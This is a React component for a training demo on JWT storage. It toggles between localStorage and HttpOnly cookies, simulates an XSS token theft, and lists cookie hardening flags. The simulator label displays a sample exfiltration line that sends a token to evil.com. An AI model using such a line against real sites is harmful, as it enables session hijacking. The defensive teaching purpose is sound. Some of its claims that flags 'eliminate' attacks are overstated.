import React, { useState } from 'react';
import { Lock, ShieldCheck, Terminal, AlertTriangle } from 'lucide-react';
import { playHapticClick, playSuccessChime, playWarningThud } from '../../utils/soundEffects';

export const JwtCookieHardening: React.FC = () => {
  const [storageType, setStorageType] = useState<'local_storage' | 'httponly_cookie'>('httponly_cookie');
  const [isAttacked, setIsAttacked] = useState(false);
  const [stolenToken, setStolenToken] = useState<string | null>(null);

  const handleSimulateXssAttack = () => {
    setIsAttacked(true);
    if (storageType === 'local_storage') {
      setStolenToken('eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ5bF9hcmNoIiwicm9sZXMiOlsic3lzdGVtX2FkbWluIl19.c78a... [EXFILTRATED]');
      playWarningThud();
    } else {
      setStolenToken(null);
      playSuccessChime();
    }
  };

  const handleReset = () => {
    setIsAttacked(false);
    setStolenToken(null);
    playHapticClick();
  };

  return (
    <div className="rounded-3xl border border-purple-500/30 bg-[#0d0918] text-purple-300 p-6 sm:p-8 shadow-2xl overflow-hidden font-mono space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-purple-900/50 pb-4">
        <div>
          <div className="flex items-center gap-2 text-xs font-bold uppercase tracking-widest text-purple-400">
            <Lock size={16} className="text-purple-400" />
            <span>JWT Cookie Hardening & Browser Zero-Trust Defense</span>
          </div>
          <p className="text-xs text-gray-400 font-sans mt-0.5">
            Why Keycloak JWT tokens must never live in browser localStorage
          </p>
        </div>

        {/* Toggle Storage Strategy */}
        <div className="flex items-center gap-1.5 bg-black/40 p-1 rounded-xl border border-white/10">
          <button
            onClick={() => {
              setStorageType('httponly_cookie');
              handleReset();
            }}
            className={`px-3 py-1 rounded-lg text-xs font-bold transition ${
              storageType === 'httponly_cookie'
                ? 'bg-emerald-600 text-white shadow-xs'
                : 'text-gray-400 hover:text-white'
            }`}
          >
            HttpOnly Cookie (Sanad)
          </button>
          <button
            onClick={() => {
              setStorageType('local_storage');
              handleReset();
            }}
            className={`px-3 py-1 rounded-lg text-xs font-bold transition ${
              storageType === 'local_storage'
                ? 'bg-rose-600 text-white shadow-xs'
                : 'text-gray-400 hover:text-white'
            }`}
          >
            localStorage (Insecure)
          </button>
        </div>
      </div>

      {/* Everyday Metaphor Banner */}
      <div className="rounded-2xl bg-purple-950/30 border border-purple-800/40 p-3.5 text-xs text-purple-200 leading-relaxed font-sans flex items-start gap-3">
        <span className="text-2xl flex-shrink-0">🪪</span>
        <div>
          <span className="font-bold text-white block mb-0.5">The Locked Employee Badge Pocket:</span>
          Storing a JWT in <code className="font-mono text-rose-300">localStorage</code> is like pinning your master security badge to your jacket where any passing pickpocket (an XSS script) can grab it. An <code className="font-mono text-emerald-300">HttpOnly</code> cookie is an internal chip sewn inside the jacket lining: the turnstile scanner (the server) reads it over radio, but no JavaScript can ever touch it!
        </div>
      </div>

      {/* Interactive XSS Attack Simulator */}
      <div className="rounded-2xl border border-white/10 bg-[#160f26] p-5 space-y-4">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2 text-xs font-bold font-mono">
            <Terminal size={15} className="text-purple-400" />
            <span className="text-gray-200">
              Simulate Malicious XSS Script: <code className="text-rose-400 font-bold">fetch('https://evil.com/steal?token=' + token)</code>
            </span>
          </div>

          <button
            onClick={handleSimulateXssAttack}
            className={`px-4 py-1.5 rounded-full text-xs font-bold transition shadow-xs ${
              storageType === 'local_storage'
                ? 'bg-rose-600 hover:bg-rose-500 text-white'
                : 'bg-emerald-600 hover:bg-emerald-500 text-white'
            }`}
          >
            Launch XSS Attack
          </button>
        </div>

        {/* Attack Outcome Screen */}
        <div className={`p-4 rounded-xl border text-xs font-sans leading-relaxed ${
          !isAttacked
            ? 'bg-black/30 border-white/5 text-gray-400'
            : storageType === 'local_storage'
            ? 'bg-rose-950/50 border-rose-500/50 text-rose-200'
            : 'bg-emerald-950/50 border-emerald-500/50 text-emerald-200'
        }`}>
          {!isAttacked && (
            <span>Click "Launch XSS Attack" above to test browser defense behavior.</span>
          )}
          {isAttacked && storageType === 'local_storage' && (
            <div className="space-y-1.5">
              <div className="flex items-center gap-2 font-bold text-rose-400 font-mono">
                <AlertTriangle size={15} />
                <span>CATASTROPHIC BREACH: JWT Token Exfiltrated!</span>
              </div>
              <p>
                JavaScript executed <code className="font-mono bg-black/40 px-1 rounded">localStorage.getItem('jwt_token')</code> without restriction. Attacker has hijacked the Admin session.
              </p>
              <div className="font-mono text-[10px] text-rose-300 break-all bg-black/50 p-2 rounded">
                Stolen Token: {stolenToken}
              </div>
            </div>
          )}
          {isAttacked && storageType === 'httponly_cookie' && (
            <div className="space-y-1.5">
              <div className="flex items-center gap-2 font-bold text-emerald-400 font-mono">
                <ShieldCheck size={15} />
                <span>ATTACK DEFEATED: document.cookie returned empty string!</span>
              </div>
              <p>
                The browser kernel strictly blocked client-side JavaScript from accessing the token. The session cookie travels only in HTTP headers over encrypted TLS. Zero token theft.
              </p>
            </div>
          )}
        </div>
      </div>

      {/* Cookie Hardening Flags Checklist */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs font-sans">
        <div className="p-3 rounded-xl bg-black/30 border border-white/10 space-y-1">
          <span className="font-mono font-bold text-emerald-400">HttpOnly Flag:</span>
          <p className="text-gray-400 text-[11px]">Blocks JavaScript access. XSS scripts cannot read or steal the JWT session.</p>
        </div>
        <div className="p-3 rounded-xl bg-black/30 border border-white/10 space-y-1">
          <span className="font-mono font-bold text-emerald-400">Secure Flag:</span>
          <p className="text-gray-400 text-[11px]">Forces transmission over HTTPS/TLS only. Eliminates Wi-Fi sniffing attacks.</p>
        </div>
        <div className="p-3 rounded-xl bg-black/30 border border-white/10 space-y-1">
          <span className="font-mono font-bold text-emerald-400">SameSite=Lax:</span>
          <p className="text-gray-400 text-[11px]">Blocks third-party websites from attaching cookies, eliminating CSRF attacks.</p>
        </div>
      </div>
    </div>
  );
};
